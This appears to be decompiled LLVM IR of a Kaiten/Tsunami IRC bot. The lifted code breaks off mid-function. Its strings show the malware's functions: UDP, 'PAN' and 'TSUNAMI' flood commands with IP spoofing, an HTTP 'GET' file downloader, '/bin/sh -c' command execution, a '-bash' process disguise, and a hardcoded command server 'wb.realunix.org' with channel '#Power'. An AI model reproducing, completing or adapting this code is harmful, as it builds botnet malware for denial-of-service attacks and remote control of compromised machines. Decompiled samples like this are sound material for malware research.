source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4_eq = internal unnamed_addr global i1 false
@lr = internal unnamed_addr global i32 0
@global_var_100000a4.1 = constant i32 1208012089
@global_var_10010000.2 = global i32 -1
@global_var_1001000c.4 = global i32 0
@global_var_1001001c.5 = local_unnamed_addr global i32* @global_var_1001000c.4
@global_var_100104e4.7 = global i32 0
@global_var_100104fc.8 = global i32 0
@global_var_10010478.10 = local_unnamed_addr global i32 0
@global_var_1000ce78.11 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_1000053c.12 = constant i32 939524097
@global_var_10010468.13 = local_unnamed_addr global i32 0
@global_var_1001048c.14 = local_unnamed_addr global i32 0
@global_var_10010464.16 = local_unnamed_addr global i32 0
@global_var_1000ce98.17 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_1000cea8.18 = constant i32 1912602624
@global_var_10010470.19 = local_unnamed_addr global i32 0
@global_var_1000ceac.20 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_10000d78.21 = constant [3 x i8] c"8`\00"
@global_var_1000cec8.22 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_10000f90.23 = constant [3 x i8] c"8`\00"
@global_var_10000f98.24 = constant [3 x i8] c"8`\00"
@global_var_1000ceec.25 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_10000fd8.26 = constant [3 x i8] c"8`\00"
@global_var_1000cf14.27 = constant [8 x i8] c"http://\00"
@global_var_1000102c.28 = constant i32 1207959584
@global_var_1000104c.29 = constant i32 939524096
@global_var_1000cf1c.30 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_10001124.31 = constant [3 x i8] c"8`\00"
@global_var_1000112c.32 = constant [3 x i8] c"9?\00"
@global_var_1000115c.33 = constant i32 1207959564
@global_var_1000cf44.34 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_100011b8.35 = constant [3 x i8] c"8`\00"
@global_var_1000cf6c.36 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_1000d080.37 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_1000d09c.38 = constant [3 x i8] c"wb\00"
@global_var_1000d0a0.39 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_10001344.40 = constant i32 1207959588
@global_var_1000d0a8.41 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_100014a8.42 = constant i32 1207959588
@global_var_100014fc.43 = constant [3 x i8] c"8`\00"
@global_var_1000d0c0.44 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_100015f4.45 = constant i32 1207959756
@global_var_1000d0e0.46 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_1000d110.47 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_1000d130.48 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_10001780.49 = constant i32 1207959652
@global_var_1000d148.50 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_100017bc.51 = constant i32 1207959592
@global_var_1000d180.52 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_1000d18c.53 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_1000d1a8.54 = constant [9 x i8] c"Disabled\00"
@global_var_1000d1b4.55 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_1000d1d0.56 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_10001890.57 = constant i32 1207959752
@global_var_1000d1f4.58 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_100018c0.59 = constant i32 1207959704
@global_var_1000d214.60 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_100018fc.61 = constant i32 1207959644
@global_var_10012b24.62 = global i32 0
@global_var_1000d23c.63 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_1000d25c.64 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_10001a04.65 = constant i32 1207959708
@global_var_1000d278.66 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_10001a34.67 = constant i32 1207959660
@global_var_1000d298.68 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_10001a78.69 = constant i32 1207959592
@global_var_1000d2b4.70 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_1000d2d4.71 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_1000d2f4.72 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_10001b58.73 = constant i32 1207959952
@global_var_1001046c.76 = global i32 0
@global_var_1000d344.77 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_10001d88.78 = constant [3 x i8] c"8`\00"
@global_var_1000d368.79 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_10001e80.80 = constant [3 x i8] c"8`\00"
@global_var_1000d390.81 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_100020f0.82 = constant i32 939524096
@global_var_1000d3ac.83 = constant i32 2
@global_var_10002164.84 = constant i32 939524096
@global_var_1000d3fc.85 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_100021bc.86 = constant [3 x i8] c"8`\00"
@global_var_100021c4.87 = constant [3 x i8] c"8`\00"
@global_var_100021f0.88 = constant i32 939524096
@global_var_1000d424.89 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_1000254c.90 = constant [3 x i8] c"9?\00"
@global_var_100025f0.91 = constant i32 939524096
@global_var_1000d43c.92 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_10002698.93 = constant [3 x i8] c"8`\00"
@global_var_100026e8.94 = constant [3 x i8] c"8`\00"
@global_var_10002708.95 = constant i32 1207982673
@global_var_1000d460.96 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_10002980.97 = constant [3 x i8] c"9?\00"
@global_var_10002a3c.98 = constant [3 x i8] c"8`\00"
@global_var_10010480.106 = local_unnamed_addr global i32 0
@global_var_10010458.107 = local_unnamed_addr global i32 0
@global_var_10010488.143 = local_unnamed_addr global i32 0
@global_var_10010474.145 = local_unnamed_addr global i32 0
@global_var_1000dc2c.158 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_10010484.159 = local_unnamed_addr global i32 0
@global_var_1000dc3c.160 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_1000dc4c.161 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_1000dc54.162 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_1000dc60.163 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_10003b84.164 = constant i32 1207959720
@global_var_10010410.168 = local_unnamed_addr global i32 4
@global_var_1000ce68.169 = constant [16 x i8] c"wb.realunix.org\00"
@global_var_10010414.170 = global [16 x i8]* @global_var_1000ce68.169
@global_var_10003f14.171 = constant i32 1207959580
@global_var_10003f6c.172 = constant [3 x i8] c"8`\00"
@global_var_1000402c.173 = constant i32 1207959668
@global_var_10004060.174 = constant [3 x i8] c"8`\00"
@global_var_1000dce0.175 = constant [6 x i8] c"-bash\00"
@global_var_10004120.176 = constant i32 939524097
@global_var_1001047c.177 = local_unnamed_addr global i32 0
@global_var_1000dce8.178 = constant [7 x i8] c"#Power\00"
@global_var_1000dcf0.179 = constant [7 x i8] c"Powerk\00"
@global_var_1000dcf8.180 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_10004264.181 = constant i32 1207959556
@global_var_1000dd24.182 = constant i32 167772160
@global_var_1000464c.183 = constant i32 1207959568
@global_var_100046f4.184 = constant i32 939524096
@global_var_1000dcc0.185 = constant [4 x i8] c"352\00"
@global_var_100100a4.186 = global [4 x i8]* @global_var_1000dcc0.185
@global_var_1000dd28.187 = constant [6 x i8] c"ERROR\00"
@global_var_10004878.188 = constant i32 1207959564
@global_var_100104bc.193 = global i32 0
@global_var_10008c78.194 = constant [3 x i8] c"8`\00"
@global_var_100100fc.195 = global i32 0
@global_var_10010494.196 = local_unnamed_addr global i32 0
@global_var_10010498.197 = local_unnamed_addr global i32 0
@global_var_10004c84.198 = constant i32 1207966521
@global_var_100108fc.199 = global i32 0
@global_var_10010490.200 = local_unnamed_addr global i32 0
@global_var_10004e78.201 = constant i32 939524118
@global_var_10004f50.202 = constant i32 939524096
@global_var_10004f74.203 = constant [3 x i8] c"9`\00"
@global_var_10004fe4.204 = constant i32 1207959864
@global_var_1000500c.206 = constant i32 1207975877
@global_var_1000e030.207 = constant [8 x i8] c"/bin/sh\00"
@global_var_1000e038.208 = constant [3 x i8] c"sh\00"
@global_var_1000e03c.209 = constant [3 x i8] c"-c\00"
@global_var_10005094.210 = constant [3 x i8] c"8`\00"
@global_var_10005110.211 = constant i32 1207959580
@global_var_10005124.212 = constant i32 939524096
@global_var_10005188.213 = constant i32 939524118
@global_var_100051ac.214 = constant i32 1207960124
@global_var_1001043c.215 = local_unnamed_addr global i32 2
@global_var_100100e4.216 = global i32 0
@global_var_10010438.217 = global i32* bitcast (i16* @global_var_10010114.190 to i32*)
@global_var_100053e4.218 = constant i32 1207959560
@global_var_10005434.219 = constant [3 x i8] c" c\00"
@global_var_10005450.220 = constant [3 x i8] c" c\00"
@global_var_1000e044.221 = constant i32 0
@global_var_100056ec.222 = constant i32 1207961084
@global_var_10005814.223 = constant i32 1207960764
@global_var_1000e078.224 = constant i32 269488136
@global_var_1000e05c.225 = constant [6 x i8] c"(nil)\00"
@global_var_1000e064.226 = constant [7 x i8] c"(null)\00"
@global_var_1000e06c.227 = constant i32 721431808
@global_var_10005c70.228 = constant i32 939524096
@global_var_1000e0f8.229 = constant i32 65793
@global_var_1000e0e0.230 = constant i32 524293
@global_var_1001044c = external local_unnamed_addr global i32
@global_var_1000f0a2.232 = constant i32 1
@global_var_1000e0d8.233 = constant [8 x i8] c" +0-#'I\00"
@global_var_1000e080.234 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1000e0c0.235 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1000e0b4.236 = constant i32 67343
@global_var_1000e0b3.237 = constant i32 50331911
@global_var_1000e0a4.238 = constant i32 268435461
@global_var_1000e094.239 = constant i32 520093701
@global_var_10006628.240 = constant [3 x i8] c"8a\00"
@global_var_10006990.241 = constant i32 1207959708
@global_var_10006a38.242 = constant i32 1207959612
@global_var_10006ca8.243 = constant i32 939589631
@global_var_10006d5c.244 = constant i32 939524118
@global_var_1000e114.245 = constant [8 x i8] c"Success\00"
@global_var_1000e104.246 = constant [15 x i8] c"Unknown error \00"
@global_var_10010454.247 = local_unnamed_addr global i32* @global_var_1000f0a2.232
@global_var_1001049c.248 = global i32 0
@global_var_10012ae0.249 = global i32 0
@global_var_10012914.250 = global i32 0
@global_var_100103e0.251 = global i32 0
@global_var_100104c8.252 = local_unnamed_addr global i32 0
@global_var_10012d4c.253 = global i32 0
@global_var_100079f0.254 = constant [3 x i8] c"8`\00"
@global_var_10007ad4.255 = constant i32 939524098
@global_var_10007b14.256 = constant [3 x i8] c"8`\00"
@global_var_10012af4.257 = global i32 0
@global_var_10010440 = external global i32
@global_var_100104ac.260 = local_unnamed_addr global i32 0
@global_var_10012d24.261 = global i32 0
@global_var_10007e20.262 = constant i32 939524108
@global_var_10007eb8.263 = constant [3 x i8] c"8`\00"
@global_var_100080c0.264 = constant i32 1207959640
@global_var_100080fc.265 = constant i32 1207959580
@global_var_10010310.266 = global i32 0
@global_var_10010328 = external global i32
@global_var_10010348.268 = global i32 -1726662223
@global_var_10010330.269 = local_unnamed_addr global i32* @global_var_10010348.268
@global_var_1001032c.270 = global i32* @global_var_10010348.268
@global_var_1000ec70.271 = constant i32 0
@global_var_10008414.272 = constant i32 939524118
@global_var_10008638.273 = constant i32 939524096
@global_var_10008828.274 = constant i32 939524130
@global_var_100103c4.275 = global i32 0
@global_var_100104a0.276 = local_unnamed_addr global i32 0
@global_var_100088bc.277 = constant i32 1207960361
@global_var_100104a8.278 = local_unnamed_addr global i32 0
@global_var_100104b0.279 = local_unnamed_addr global i32 0
@global_var_100104b4.280 = local_unnamed_addr global i32 0
@global_var_1000ec98.281 = constant [10 x i8] c"/dev/null\00"
@global_var_100104b8.282 = local_unnamed_addr global i32 0
@global_var_100104a4.283 = local_unnamed_addr global i32 0
@global_var_10008f90.284 = constant i32 939524096
@global_var_10008fac.285 = constant i32 939524096
@global_var_10008fd0.286 = constant i32 939524285
@global_var_100104dc.287 = local_unnamed_addr global i32 0
@global_var_100094c0.288 = constant i32 939524118
@global_var_100104c0.289 = global i32 0
@global_var_10009600.290 = constant i32 939524180
@global_var_10009980.291 = constant i32 939524105
@global_var_1000f2d0.292 = constant [4 x i8] c"inf\00"
@global_var_1000f2d3.294 = constant i32 4804166
@global_var_1000f2e0.295 = constant i32 771763200
@global_var_10012b0c.297 = global i32 0
@global_var_100104c4.298 = local_unnamed_addr global i32 0
@global_var_1000a938.300 = constant i32 1207960848
@global_var_100104cc.301 = local_unnamed_addr global i32 0
@global_var_1000f330.302 = constant i32 771751936
@global_var_10012d3c.303 = global i32 0
@global_var_1000aa28.304 = constant [3 x i8] c"8a\00"
@global_var_1000aa34.305 = constant i32 939524097
@global_var_1000ab08.306 = constant i32 939524097
@global_var_1000abdc.307 = constant i32 939524097
@global_var_1000ac08.308 = constant i32 939524100
@global_var_1000ace8.309 = constant i32 1207959684
@global_var_1000ae64.310 = constant i32 939589631
@global_var_1000f34c.311 = constant i32 1912602624
@global_var_1000f338.312 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1000f350.313 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1000f368.314 = constant [11 x i8] c"nameserver\00"
@global_var_1000f374.315 = constant [7 x i8] c"domain\00"
@global_var_1000f37c.316 = constant [7 x i8] c"search\00"
@global_var_1000b19c.317 = constant i32 1207959568
@global_var_1000b1a4.318 = constant i32 939524099
@global_var_100103f8.319 = global i32 0
@global_var_1000b3b8.320 = constant i32 939524129
@global_var_100104d0.321 = local_unnamed_addr global i32 0
@global_var_1000b428.322 = constant [3 x i8] c"8`\00"
@global_var_1000b460.323 = constant i32 939524129
@global_var_100104d4.324 = local_unnamed_addr global i32 0
@global_var_100104d8.325 = local_unnamed_addr global i32 0
@global_var_1000b870.326 = constant i32 939524171
@global_var_1000b920.327 = constant i32 939524105
@global_var_1000bca0.328 = constant [3 x i8] c"8`\00"
@global_var_1000f398.329 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1000be98.330 = constant [3 x i8] c"9 \00"
@global_var_1000bea4.331 = constant i32 939524193
@global_var_1000bf0c.333 = constant i32 939524101
@global_var_1000bff8.334 = constant i32 939524124
@global_var_1000c070.335 = constant i32 1207960116
@global_var_1000c088.336 = constant i32 939524105
@global_var_1000c200.337 = constant [3 x i8] c"9 \00"
@global_var_1000f3ac.338 = constant [3 x i8] c"%x\00"
@global_var_1000c28c.339 = constant i32 939524124
@global_var_1000c2b0.340 = constant i32 939524193
@global_var_1000f3b0.341 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1000f3bc.342 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1000c99c.343 = constant i32 1207959560
@global_var_1000ca34.344 = constant i32 939589631
@global_var_10010004.345 = global i32 0
@global_var_100104e0.3 = local_unnamed_addr global i8 0
@global_var_1001045c.9 = local_unnamed_addr global i8 0
@global_var_10010460.15 = external local_unnamed_addr global i8*
@global_var_10010463.165 = external local_unnamed_addr global i8*
@global_var_10010462.166 = external local_unnamed_addr global i8*
@global_var_10010461.167 = external global i8*
@global_var_10010114.190 = global i16 288
@global_var_10010164.191 = local_unnamed_addr global i16 272
@global_var_100103dc.299 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_10000094() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100000a4.1 to i32), i32* @lr, align 4
  %v0_100000a0 = call i32 @function_10000168()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @function_1000cddc(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @function_100000b8() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_100104e0.3, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1001001c.5 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1001001c.5 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1001001c.5 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_100104e0.3, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_100104e0.3, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @function_1000014c() local_unnamed_addr {
dec_label_pc_1000014c:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @function_10000168() local_unnamed_addr {
dec_label_pc_10000168:
  %v3_100001a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 16) to i32*), align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %dec_label_pc_10000168
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %dec_label_pc_10000168
  ret i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 16)
}

define i32 @function_100001d4() local_unnamed_addr {
dec_label_pc_100001d4:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @function_10008d64(i32 268452024, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 -12728), i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @function_10000238(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10000238:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %v2_1000025c = load i8, i8* %arg1, align 1
  %v3_1000026c = icmp eq i8 %v2_1000025c, 42
  br i1 %v3_1000026c, label %dec_label_pc_100002a4, label %dec_label_pc_10000274

dec_label_pc_10000274:                            ; preds = %dec_label_pc_10000238
  %v3_10000278 = icmp eq i8 %v2_1000025c, 63
  br i1 %v3_10000278, label %dec_label_pc_10000318, label %dec_label_pc_10000280

dec_label_pc_10000280:                            ; preds = %dec_label_pc_10000274
  %v3_10000284 = icmp eq i8 %v2_1000025c, 0
  br i1 %v3_10000284, label %dec_label_pc_10000290, label %dec_label_pc_10000374

dec_label_pc_10000290:                            ; preds = %dec_label_pc_10000280
  %v2_10000294 = load i8, i8* %tmp, align 1
  %v3_10000294 = zext i8 %v2_10000294 to i32
  br label %dec_label_pc_100003f8

dec_label_pc_100002a4:                            ; preds = %dec_label_pc_10000238
  %v2_100002a8 = add i32 %tmp8, 1
  store i32 268436152, i32* @lr, align 4
  %v5_100002b4 = inttoptr i32 %v2_100002a8 to i8*
  %v6_100002b4 = call i32 @function_10000238(i8* %v5_100002b4, i32 %arg2, i32 %tmp8)
  %v3_100002bc = icmp eq i32 %v6_100002b4, 0
  br i1 %v3_100002bc, label %dec_label_pc_10000304, label %dec_label_pc_100002c4

dec_label_pc_100002c4:                            ; preds = %dec_label_pc_100002a4
  %v2_100002c8 = load i8, i8* %tmp, align 1
  %v3_100002d0 = icmp eq i8 %v2_100002c8, 0
  br i1 %v3_100002d0, label %dec_label_pc_1000030c, label %dec_label_pc_100002d8

dec_label_pc_100002d8:                            ; preds = %dec_label_pc_100002c4
  %v2_100002dc = add i32 %arg2, 1
  store i32 268436204, i32* @lr, align 4
  %v6_100002e8 = call i32 @function_10000238(i8* nonnull %arg1, i32 %v2_100002dc, i32 %arg2)
  %v3_100002f0 = icmp eq i32 %v6_100002e8, 0
  br i1 %v3_100002f0, label %dec_label_pc_10000304, label %dec_label_pc_1000030c

dec_label_pc_10000304:                            ; preds = %dec_label_pc_100002d8, %dec_label_pc_100002a4
  br label %dec_label_pc_1000030c

dec_label_pc_1000030c:                            ; preds = %dec_label_pc_100002c4, %dec_label_pc_100002d8, %dec_label_pc_10000304
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10000304 ], [ 1, %dec_label_pc_100002d8 ], [ 1, %dec_label_pc_100002c4 ]
  br label %dec_label_pc_100003f8

dec_label_pc_10000318:                            ; preds = %dec_label_pc_10000274
  %v2_1000031c = load i8, i8* %tmp, align 1
  %v3_10000324 = icmp eq i8 %v2_1000031c, 0
  br i1 %v3_10000324, label %dec_label_pc_10000368, label %dec_label_pc_1000032c

dec_label_pc_1000032c:                            ; preds = %dec_label_pc_10000318
  %v1_10000330 = add i32 %tmp8, 1
  %v2_10000338 = add i32 %arg2, 1
  store i32 268436296, i32* @lr, align 4
  %v4_10000344 = inttoptr i32 %v1_10000330 to i8*
  %v5_10000344 = call i32 @function_10000238(i8* %v4_10000344, i32 %v2_10000338, i32 %arg2)
  %v3_1000034c = icmp ne i32 %v5_10000344, 0
  %. = zext i1 %v3_1000034c to i32
  br label %dec_label_pc_10000368

dec_label_pc_10000368:                            ; preds = %dec_label_pc_1000032c, %dec_label_pc_10000318
  %storemerge2 = phi i32 [ 1, %dec_label_pc_10000318 ], [ %., %dec_label_pc_1000032c ]
  br label %dec_label_pc_100003f8

dec_label_pc_10000374:                            ; preds = %dec_label_pc_10000280
  %v3_10000378 = load i8, i8* %arg1, align 1
  %v4_10000378 = zext i8 %v3_10000378 to i32
  store i32 268436364, i32* @lr, align 4
  %v3_10000388 = call i32 @function_10004b28(i32 %v4_10000378, i32 %tmp8)
  %v3_10000394 = load i8, i8* %tmp, align 1
  %v4_10000394 = zext i8 %v3_10000394 to i32
  store i32 268436392, i32* @lr, align 4
  %v3_100003a4 = call i32 @function_10004b28(i32 %v4_10000394, i32 %arg2)
  %v4_100003ac = icmp eq i32 %v3_10000388, %v3_100003a4
  br i1 %v4_100003ac, label %dec_label_pc_100003b4, label %dec_label_pc_100003f0

dec_label_pc_100003b4:                            ; preds = %dec_label_pc_10000374
  %v1_100003b8 = add i32 %tmp8, 1
  %v2_100003c0 = add i32 %arg2, 1
  store i32 268436432, i32* @lr, align 4
  %v4_100003cc = inttoptr i32 %v1_100003b8 to i8*
  %v5_100003cc = call i32 @function_10000238(i8* %v4_100003cc, i32 %v2_100003c0, i32 %arg2)
  %v3_100003d4 = icmp ne i32 %v5_100003cc, 0
  %.7 = zext i1 %v3_100003d4 to i32
  br label %dec_label_pc_100003f0

dec_label_pc_100003f0:                            ; preds = %dec_label_pc_100003b4, %dec_label_pc_10000374
  %storemerge = phi i32 [ 1, %dec_label_pc_10000374 ], [ %.7, %dec_label_pc_100003b4 ]
  br label %dec_label_pc_100003f8

dec_label_pc_100003f8:                            ; preds = %dec_label_pc_10000368, %dec_label_pc_1000030c, %dec_label_pc_10000290, %dec_label_pc_100003f0
  %stack_var_-36.0 = phi i32 [ %storemerge3, %dec_label_pc_1000030c ], [ %storemerge2, %dec_label_pc_10000368 ], [ %v3_10000294, %dec_label_pc_10000290 ], [ %storemerge, %dec_label_pc_100003f0 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @function_10004b28, { 1, 0 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_100003f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000030c, { 2, 1, 0 }
}

define i32 @function_1000041c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000041c:
  %stack_var_-136 = alloca i32, align 4
  store i32 2, i32* %stack_var_-136, align 4
  store i32 ptrtoint (i32* @global_var_100104fc.8 to i32), i32* @r3, align 4
  %v2_100004a0 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268436652, i32* @lr, align 4
  %v4_100004a8 = call i32 @function_10004cac(i32 ptrtoint (i32* @global_var_100104fc.8 to i32), i32 %arg2, i32 %v2_100004a0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  store i32 ptrtoint (i32* @global_var_100104fc.8 to i32), i32* @r3, align 4
  %v0_100004b4 = call i32 @function_10006ed4()
  store i32 268436688, i32* @lr, align 4
  %v2_100004cc = call i32 @function_10004ae0(i32 %arg1, i32 ptrtoint (i32* @global_var_100104fc.8 to i32))
  ret i32 %v2_100004cc

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100104fc.8 to i32), { 1, 2, 0, 3 }
}

define i32 @function_100004f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100004f0:
  %v3_1000050c = load i8, i8* @global_var_1001045c.9, align 1
  %v3_10000514 = icmp eq i8 %v3_1000050c, 1
  br i1 %v3_10000514, label %dec_label_pc_1000051c, label %dec_label_pc_10000548

dec_label_pc_1000051c:                            ; preds = %dec_label_pc_100004f0
  %v3_10000520 = load i32, i32* @global_var_10010478.10, align 4
  %v5_10000538 = call i32 @function_1000041c(i32 %v3_10000520, i32 ptrtoint ([30 x i8]* @global_var_1000ce78.11 to i32), i32 %arg1, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_1000064c

dec_label_pc_10000548:                            ; preds = %dec_label_pc_100004f0
  store i32 268436812, i32* @lr, align 4
